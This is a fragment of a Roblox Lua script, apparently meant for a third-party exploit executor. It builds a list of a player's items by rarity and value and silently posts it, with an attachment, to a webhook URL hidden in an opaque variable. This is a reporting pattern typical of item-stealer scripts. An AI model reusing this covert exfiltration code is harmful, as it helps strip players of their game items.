-- ===== WEBHOOK SENDING =====
local function SendWebhook(content, file)
    local payload = {
        Url     = e,
        Method  = 'POST',
        Headers = {['Content-Type']='application/json'},
        Body    = j:JSONEncode(content),
    }
    if file then
        payload.Files = {{Name=file.name or 'inventory.txt', Data=file.data, ContentType='text/plain'}}
    end
    pcall(function()
        if request then request(payload)
        elseif http_request then http_request(payload)
        elseif syn and syn.request then syn.request(payload)
        else game:GetService("HttpService"):PostAsync(e, j:JSONEncode(payload.Body), Enum.HttpContentType.ApplicationJson) end
    end)
end

local function GenerateInventoryLines(list)
    local lines  = {}
    local groups = {}
    for _, item in ipairs(list) do
        local rarity = item.Rarity or 'Unknown'
        if not groups[rarity] then groups[rarity] = {} end
        table.insert(groups[rarity], item)
    end
    for _, rarity in ipairs(l) do
        if groups[rarity] then
            local items = groups[rarity]
            table.sort(items, function(x,y) return (x.Value*x.Amount)>(y.Value*y.Amount) end)
            table.insert(lines, rarity)
            for _, item in ipairs(items) do
                local name = toTitleCase(item.ItemName)
                if item.IsChroma then name = name..' [CHROMA]' end
                table.insert(lines, string.format('  - %dx %s → %d', item.Amount, name, item.Value*item.Amount))
            end
        end
    end
    return lines
end

